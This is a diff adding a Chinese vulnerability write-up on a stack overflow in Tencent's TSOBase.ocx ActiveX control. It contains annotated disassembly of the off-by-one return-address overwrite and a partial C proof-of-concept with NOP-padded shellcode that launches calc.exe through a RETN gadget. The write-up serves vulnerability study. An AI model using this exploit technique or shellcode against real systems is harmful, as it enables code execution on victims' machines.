@@ -1,0 +1,242 @@
+
+# 腾讯在线安全检查控件溢出分析
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-136.htm`](https://www.pediy.com/kssd/pediy09/pediy09-136.htm)
+
+> 软件文件: `TSOBase.ocx`
+
+> 软件名称:
+
+> Tencent Online Safety Center
+
+> 软件描述:
+
+> 腾讯在线安全检查控件
+
+> 软件版本:
+
+> 2006, 12, 20, 4
+
+> 测试平台:
+
+> `VC6+xp sp1`
+
+> 申明:
+
+> 本文章只作学习与交流用,一切使用后果自行负责
+
+看学改名后,好长时间没有来转了,五一有时间,写一篇来灌下水.也不知道这个算不算软件安全方面.
+
+控件 `TSOBase.ocx`(有 `UPX` 壳)的一个接口函数
+
+``` 
+BOOL CTSOClean::DownloadPatch(LPCTSTR lpszBuildIDs)
+{
+  BOOL result;
+  static BYTE parms[] =
+    VTS_BSTR;
+  InvokeHelper(0xf, DISPATCH_METHOD, VT_BOOL, (void*)&result, parms,
+    lpszBuildIDs);
+  return result;
+}
+```
+存在栈溢出漏洞.
+
+函数的字符串需要经过 `MultiByteToWideChar`,`WideCharToMultiByte` 的转化处理
+
+因此在调用该控件的软件(俺的是 `test.exe`)上下 `WideCharToMultiByte`(函数的开始处)断点
+
+处理完后经过几步调用会来到下面的处理过程中,进入时,堆栈的状态如下:
+
+high
+
+`________________`
+
+| .... |
+
+|转换字符偏移|`10001ea0`
+
+|函数返回 `EIP` |<-当前 `esp`
+
+low
+
+```
+10004790  sub esp,108                         esp<- esp-108h (临时变量存储空间)
+10004796  push ebx                            esp<- esp-4
+10004797  push ebp          esp<- esp-4
+10004798  mov ebp,dword ptr ss:[esp+114]      ebp<- 转换字节指针偏移
+1000479F  xor ebx,ebx
+100047A1  push esi                            esp<- esp-4
+100047A2  cmp ebp,ebx                         判断是否为空指针
+100047A4  push edi          esp<- esp-4
+100047A5  mov dword ptr ss:[esp+10],ecx
+100047A9  je TSOBase.10004914
+100047AF  mov edi,ebp
+100047B1  or ecx,FFFFFFFF
+100047B4  xor eax,eax
+100047B6  repne scas byte ptr es:[edi]
+100047B8  not ecx
+100047BA  dec ecx                             判断字符长度(<1)
+100047BB  je TSOBase.10004914
+100047C1  mov ecx,40
+100047C6  lea edi,dword ptr ss:[esp+15]
+100047CA  mov byte ptr ss:[esp+14],al         1 字节清零
+100047CE  xor esi,esi
+100047D0  rep stos dword ptr es:[edi]         40h*4 字节清零
+100047D2  stos word ptr es:[edi]              2 字节清零
+100047D4  stos byte ptr es:[edi]              1 字节清零
+100047D5  mov edi,ebp                         (esp+14h--esp+118h)共 104h 字节
+100047D7  or ecx,FFFFFFFF
+100047DA  xor eax,eax
+100047DC  mov dword ptr ds:[1006C654],ebx
+100047E2  repne scas byte ptr es:[edi]
+100047E4  not ecx
+100047E6  dec ecx
+100047E7  inc ecx                             获取经转换字符长度
+100047E8  je TSOBase.10004914
+100047EE  mov dl,byte ptr ds:[ebx+ebp]        读取每字节转换字符
+100047F1  cmp dl,7C                           判断字符是否为'|'
+100047F4  je short TSOBase.10004819           是则把前面保存(esp+14h--esp+118h)的清零,
+100047F6  mov edi,ebp                         从转换字符的下一个字符开始处理
+100047F8  or ecx,FFFFFFFF
+100047FB  xor eax,eax
+100047FD  repne scas byte ptr es:[edi]
+100047FF  not ecx
+10004801  dec ecx
+10004802  cmp ebx,ecx                         判断是否处理完毕
+10004804  je short TSOBase.10004819
+10004806  cmp esi,104                         判断保存字符长度是否大于 104h
+1000480C  jg TSOBase.10004914                 大于结束
+10004812  mov byte ptr ss:[esp+esi+14],dl     拷贝字符进入上面清零的空间(esp+14h--esp+118h)
+10004816  inc esi                             上面这里是溢出的关键原因, 当计数到 104h 字节时,
+10004817  jmp short TSOBase.10004890          由于没有进行严格的处理,导致还能拷贝第 105h 字节
+10004819  mov eax,dword ptr ds:[1006C650]     即 mov byte ptr ss:[esp+118],dl 而 esp+118 正是
+1000481E  xor esi,esi                         返回函数 EIP 保存的栈空间, 覆盖一字节后会导致跳转到其他空间
+10004820  test eax,eax
+10004822  jle short TSOBase.10004881
+10004824  mov ebp,TSOBase.1001F664
+10004829  mov edi,ebp
+1000482B  or ecx,FFFFFFFF
+1000482E  xor eax,eax
+10004830  repne scas byte ptr es:[edi]
+10004832  not ecx
+10004834  dec ecx
+10004835  lea eax,dword ptr ss:[esp+14]
+10004839  push ecx
+1000483A  push ebp
+1000483B  push eax
+1000483C  call dword ptr ds:[1001A50C]     ; msvcrt.strncmp
+10004842  add esp,0C
+10004845  test eax,eax
+10004847  je short TSOBase.1000485B
+10004849  mov eax,dword ptr ds:[1006C650]
+1000484E  inc esi
+1000484F  add ebp,268
+10004855  cmp esi,eax
+10004857  jl short TSOBase.10004829
+10004859  jmp short TSOBase.1000487A
+1000485B  lea ecx,dword ptr ds:[esi+esi*8]
+1000485E  lea edx,dword ptr ds:[esi+ecx*2]
+10004861  lea eax,dword ptr ds:[esi+edx*4]
+10004864  mov dword ptr ds:[eax*8+1001F774>
+1000486F  mov eax,dword ptr ds:[1006C654]
+10004874  inc eax
+10004875  mov dword ptr ds:[1006C654],eax
+1000487A  mov ebp,dword ptr ss:[esp+11C]
+10004881  xor esi,esi
+10004883  mov ecx,41
+10004888  xor eax,eax
+1000488A  lea edi,dword ptr ss:[esp+14]
+1000488E  rep stos dword ptr es:[edi]
+10004890  mov edi,ebp
+10004892  or ecx,FFFFFFFF
+10004895  xor eax,eax
+10004897  inc ebx
+10004898  repne scas byte ptr es:[edi]
+1000489A  not ecx
+1000489C  cmp ebx,ecx                         判断转换是否处理完毕字符
+1000489E  jb TSOBase.100047EE                  否继续进行处理
+100048A4  mov eax,dword ptr ds:[1006C654]
+100048A9  xor edi,edi
+100048AB  cmp eax,edi
+100048AD  je short TSOBase.10004914
+100048AF  mov esi,dword ptr ss:[esp+10]
+100048B3  mov ecx,esi
+100048B5  call TSOBase.10004930
+100048BA  mov ecx,dword ptr ds:[1006C654]
+100048C0  push edi
+100048C1  push edi
+100048C2  push esi
+100048C3  push TSOBase.100049A0
+100048C8  mov dword ptr ds:[esi+8610],ecx
+100048CE  mov dword ptr ds:[esi+8614],edi
+100048D4  mov dword ptr ds:[esi+8618],-1
+100048DE  push edi
+100048DF  mov dword ptr ds:[1006C658],edi
+100048E5  push edi
+100048E6  mov dword ptr ds:[esi+86B4],edi
+100048EC  mov dword ptr ds:[esi+86B8],edi
+100048F2  call dword ptr ds:[1001A058]     ; kernel32.CreateThread
+100048F8  xor edx,edx
+100048FA  cmp eax,edi
+100048FC  mov dword ptr ds:[esi+86B0],eax
+10004902  pop edi
+10004903  setne dl
+10004906  pop esi
+10004907  pop ebp
+10004908  mov eax,edx
+1000490A  pop ebx
+1000490B  add esp,108
+10004911  retn 4
+10004914  pop edi
+10004915  pop esi
+10004916  pop ebp
+10004917  xor eax,eax
+10004919  pop ebx
+1000491A  add esp,108
+10004920  retn 4                              错误返回
+```
+
+由上面的分析可以知道, 进入该处理函数后,函数分配了 `108h+4+4+4+4=118h` 的栈空间作为临时数据的存储空间
+
+而在处理转换后的字符串时,从 `ESP+14` 开始进行字符的临时保存.当转换后的字符长度超过 104 字节时,第 105 字节
+
+会覆盖到 `esp+118` 处, 正好这里是函数返回的地址.要成功利用该漏洞需要把其转换到执行 `RETN` 指令的地址我直接
+
+选择了(`10001ec5`)所以第 105 个字节的值需为(`0xc5`)
+
+现在看一下 `10004920` 处堆栈的的情况
+
+high
+
+`_______________________`
+
++ .... +
+| 0x16498C | 转换字符串地址 ----- 4
++ 0x73D4436C + MFC42.73D4436C(应该是 `InvokeHelper`) ----3
+| 0x16498C | 转换字符串地址 ----- 2
++ 0x10001ec5 + 转换字符串地址 ----- 1
+\-----------------------
+
+low
+
+执行 `retn 4` 后会返回到 1(`0x10001ec5`)执行,`esp->3`, 执行完 1 后,会继续返回到 3 处执行,此时 `esp->4`,执行完 3
+
+就进入到我们的指令地址.指令编码要注意 `UNICODE` 转换对字符的处理,防止指令编码不能正确还原
+
+``` 
+CTestDlg::test()
+{
+  char * code="\\x33\\xc0\\x50\\x68\\x2e\\x65\\x78\\x65"
+      "\\x68\\x63\\x61\\x6c\\x63\\x54\\x5e\\x6a"
+      "\\x01\\x56\\x05\\x12\\x55\\x51\\x22\\x05"
+      "\\x12\\x60\\x51\\x22\\x05\\x11\\x48\\x42"
+      "\\x33\\xff\\xd0\\x5f\\x5f\\x5f\\x00";
+  char shellcode[0x120];
+  memset(shellcode, 0x90, 0x120);
+  memcpy(shellcode, code, strlen(code));
+  shellcode[0x103]='\\xc3';
+  shellcode[0x104]= '\\xc5';
+  shellcode[0x105]= '\\xc5';
+  shellcode[0x108]= '\\x00';
+```
